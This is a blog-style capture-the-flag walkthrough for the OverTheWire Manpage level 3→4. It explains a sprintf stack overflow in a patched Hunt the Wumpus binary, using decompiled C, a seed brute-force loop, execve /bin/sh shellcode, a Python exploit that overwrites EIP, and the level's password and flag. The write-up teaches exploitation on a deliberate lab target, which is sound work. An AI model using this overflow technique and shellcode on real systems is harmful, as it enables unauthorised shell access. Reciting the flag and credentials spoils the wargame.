---
layout: post-with-comments
title: "OverTheWire Manpage Level 3 → 4 tutorial!!"
permalink: /posts/overTheWire-Manpage-Level-3-to-4/
tags: [overthewire, manpage, walkthrough, ctf, linux, exploitation, sprintf, seed]
description: "A step by step tutorial for OverTheWire Manpage Level 3 → 4!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .manpage-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .manpage-nav .nav-left,.manpage-nav .nav-center,.manpage-nav .nav-right{flex:1}
  .manpage-nav .nav-left{text-align:left}
  .manpage-nav .nav-center{text-align:center}
  .manpage-nav .nav-right{text-align:right}
  .manpage-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .manpage-nav a:hover{transform:translateY(-1px)}
  .manpage-nav .disabled{opacity:.55}
  :root[data-theme='light'] .manpage-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="manpage-nav" aria-label="Manpage level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Manpage-Level-2-to-3/' | relative_url }}">← Previous: Level 2 → 3</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/manpage/manpage4.html" target="_blank" rel="noopener">Official (Level 4) ↗</a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Manpage-Level-4-to-5/' | relative_url }}">Next: Level 4 → 5 →</a>
  </div>
</nav>

## Login

Use the **manpage3** account from the previous level:

```bash
ssh manpage3@manpage.labs.overthewire.org -p 2224
# password: iaceigicie
````

---

## Goal

Exploit the **Hunt the Wumpus** game to gain a shell. This level ships a patched build that:

* moves the common input buffer into **local** `inp[BUFSIZ]` arrays (size **2048**) in several functions, and
* introduces a new function **`log_winner`** that asks for your first/last name and logs them using `sprintf`.

We’ll craft inputs so leftover data in a previous **2 KB input buffer** becomes the `lastname` pointer for `sprintf`, letting us **overwrite EIP** and pivot to shellcode in the environment.

---

## Given diff (highlights)

```diff
+#include <stdlib.h>
+#define BUFSIZ 2048
+#define LOGFILE "/dev/null"
+FILE *logfile;
-
-static char inp[BUFSIZ];		/* common input buffer */
+/* each function now has a local: char inp[BUFSIZ]; */
+
+void log_winner()
+{
+    char buf[256];
+    char firstname[256], lastname[256];
+    int t = time(NULL);
+    logfile = fopen(LOGFILE,"a");
+    printf("firstname and lastname?\n");
+    if( !fgets(buf, sizeof buf, stdin) )
+      exit(1);
+
+    sscanf(buf, "%100s %100s", firstname, lastname);
+    sprintf(buf, "%s firstname:%s lastname: %s\n", ctime(&t), firstname, lastname);
+
+    fputs(buf, logfile);
+    fclose(logfile);
+}
@@
-    }
+    }
+    if( finished == WIN )
+        log_winner();
```

---

## Decompiled Functions (full context)

### `main`

```c
int main(int argc,char **argv)
{
    int i;
    uint seed;
    int num;
    int c;

    if ((argc < 2) || (i = strcmp(argv[1],"-s"), i != 0)) {
        seed = time((time_t *)0);
        srand(seed);
    }
    else {
        seed = atoi(argv[2]);
        srand(seed);
    }
    i = getlet("INSTRUCTIONS (Y-N)");
    if (i == 'Y') {
        print_instructions();
    }
badlocs:
    do {
        j = 0;
        while (i = j, j < 6) {
            num = rand();
            save[i] = num % 0x14;
            loc[i]  = save[i];
            j = j + 1;
        }
        j = 0;
        while (j < 6) {
            k = 0;
            while (k < 6) {
                if ((j != k) && (loc[j] == loc[k])) goto badlocs;
                k = k + 1;
            }
            j = j + 1;
        }
        do {
            arrows = 5;
            scratchloc = loc[0];
            puts("HUNT THE WUMPUS");
            do {
                while ( true ) {
                    check_hazards();
                    i = move_or_shoot();
                    if (i != 0) break;
                    move();
                    if (finished != 0) goto LAB_08049267;
                }
                shoot();
            } while (finished == 0);
LAB_08049267:
            if (finished == -1) {
                puts("HA HA HA – YOU LOSE!");
            }
            else {
                if (finished == 1) {
                    log_winner();
                }
            }
            puts("HEE HEE HEE – THE WUMPUS'LL GET YOU NEXT TIME!!");
            j = 0;
            while (j < 6) {
                loc[j] = save[j];
                j = j + 1;
            }
            i = getlet("SAME SETUP (Y-N)");
        } while (i == 'Y');
    } while (true);
}
```

### `getlet`

```c
int getlet(char *prompt)
{
    char *ret;
    int instruct;
    char inp [2048];

    printf("%s\n?",prompt);
    ret = fgets(inp,2048,stdin);
    if (ret != (char *)0x0) {
        instruct = toupper((int)inp[0]);
        return instruct;
    }
    fputc('\n',stdout);
    exit(1);
}
```

### `check_hazards`

```c
void check_hazards(void)
{
    int pos;
    int room;

    puts("");
    k = 0;
    while (k < 3)            /* Check nearby rooms */ {
        pos = cave[loc[0] * 3 + k];
        if (loc[1] == pos) {
            puts("I SMELL A WUMPUS!");
        }
        else {
            if ((loc[2] == pos) || (loc[3] == pos)) {
                puts("I FEEL A DRAFT");
            }
            else {
                if ((loc[4] == pos) || (loc[5] == pos)) {
                    puts("BATS NEARBY!");
                }
            }
        }
        k = k + 1;
    }
    printf("YOU ARE IN ROOM %d\n",loc[0] + 1);
    printf("TUNNELS LEAD TO %d %d %d\n",cave[loc[0] * 3] + 1,
                                       cave[loc[0] * 3 + 1] + 1,
                                       cave[loc[0] * 3 + 2] + 1);
    puts("");
    return;
}
```

### `move_or_shoot`

```c
int move_or_shoot(void)
{
    int ret;
    int c;

    do {
        ret = getlet("SHOOT OR MOVE (S-M)");
        if (ret == 'S') {
            return 1;
        }
    } while (ret != 'M');
    return 0;
}
```

### `shoot` (expanded from your decompile)

```c
void shoot(void)
{
    int i;
    int num;
    int j;
    int j9;
    int k1;

    finished = 0;
    do {
        do {
            num = getnum("NO. OF ROOMS (1–5)");
        } while (num < 1);
    } while (5 < num);
    k = 0;
    while (i = k, k < num) {
        j = getnum("ROOM #");
        path[i] = j + -1;
        if ((1 < k) && (path[k] == path[k - 2]) /* Check not go back */) {
            puts("ARROWS AREN'T THAT CROOKED – TRY ANOTHER ROOM");
            k = k + -1;
        }
        k = k + 1;
    }
    scratchloc = loc[0];
    k = 0;
    do {
        if (num <= k) {
            if (finished == 0) {
                puts("MISSED");
                scratchloc = loc[0];
                move_wumpus();
                arrows = arrows + -1;
                if (arrows < 1) {
                    finished = -1;
                }
            }
            return;
        }
        k1 = 0;
        while (i = scratchloc, k1 < 3) {
            if (cave[scratchloc * 3 + k1] == path[k]) {
                scratchloc = path[k];
                check_shot();
                if (finished != 0) {
                    return;
                }
            }
            k1 = k1 + 1;
        }
        j = rand();
        scratchloc = cave[i * 3 + j % 3];
        check_shot();
        k = k + 1;
    } while ( true );
}
```

### `getnum`

```c
int getnum(char *prompt)
{
    char *buf;
    int ret;
    char inp [2048];

    printf("%s\n?",prompt);
    buf = fgets(inp,2048,stdin);
    if (buf != (char *)0x0) {
        ret = atoi(inp);
        return ret;
    }
    fputc('\n',stdout);
    exit(1);
}
```

### `log_winner`

```c
void log_winner(void)
{
    char *pcVar1;
    time_t t;
    char lastname [256];
    char firstname[256];
    char buf      [256];

    t = time((time_t *)0x0);
    logfile = (FILE *)fopen("/dev/null","a");
    puts("firstname and lastname?");
    pcVar1 = fgets(buf,256,stdin);
    if (pcVar1 == (char *)0x0) {
        /* WARNING: Subroutine does not return */
        exit(1);
    }
    __isoc99_sscanf(buf,"%100s %100s",firstname,lastname);
    pcVar1 = ctime(&t);
    sprintf(buf,"%s firstname:%s lastname: %s\n",pcVar1,firstname,lastname);
    fputs(buf,(FILE *)logfile);
    fclose((FILE *)logfile);
    return;
}
```

---

## Exploit Strategy

We abuse `sprintf` in `log_winner`: it copies `lastname` unchecked into a **256-byte** buffer, letting us overwrite EIP with an address of shellcode in the environment.

1. **Find a seed** where shooting once to room 1 wins (bruteforce → seed=22).
2. **Put shellcode in env** (NOP sled + execve `/bin/sh`).
3. **Overflow via `getnum`**: send `1` + `'A'*1303` so `lastname` later points into that large region.
4. At `log_winner`, provide `CCCC` for firstname; `lastname` remains the prior **2 KB** content.
5. `sprintf` copies 1300+ bytes into 256-byte `buf`, smashing EIP; overwrite with env shellcode address (example: `0xffffdf04`).

---

## Payload & Exploit

### Brute-force seed

```bash
for s in $(seq 0 999); do
  printf 'N\nS\n1\n1\n' | /manpage/manpage4 -s "$s" 2>/dev/null | grep -q "firstname and lastname\?" \
    && { echo "Success: seed=$s"; break; } || echo "seed $s failed";
done
```

### Env shellcode

```bash
export SC=$(python3 - <<'PY'
sc  = b"\x90"*100
sc += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
sc += b"\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print(sc.decode('latin1'))
PY)
# Example address seen: 0xffffdf04 (confirm in your run)
```

### One-shot exploit (seed=22)

```bash
(
python3 - <<'PY'
import sys
# N=no instructions, S=shoot, "1" rooms, then room "1" with huge padding
sys.stdout.write('N\nS\n1\n')
sys.stdout.write('1' + 'A'*1303 + 'A'*209)
sys.stdout.buffer.write(b"\x04\xdf\xff\xff")  # EIP → env shellcode @ 0xffffdf04
sys.stdout.write('\n')
sys.stdout.write('CCCC\n')  # firstname; lastname pointer stays on our big buffer
PY
; cat) | /manpage/manpage4 -s 22
```

You should land in a shell; flag retrieved:

```
vahshaihug
```

---

## Why this works

* **Local 2 KB buffers** (`inp[2048]`) retain our large input; later parsing reuses that memory as `lastname`.
* `sprintf` writes to a **256-byte** stack buffer without bounds checks → classic overflow.
* We control the overwrite to point EIP at our **environment shellcode** → interactive shell.

---

## Troubleshooting

* **Different seed/addresses:** Re-bruteforce seed; verify addresses in `gdb`.
* **Unicode byte issues:** Always emit non-ASCII via `sys.stdout.buffer.write`.
* **No shell:** Ensure `export SC=...` is done in the same shell that runs the target.

---

**Congrats 🎉** You’ve cleared **Level 3 → 4** — textbook `sprintf` pwn with a fun game twist!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

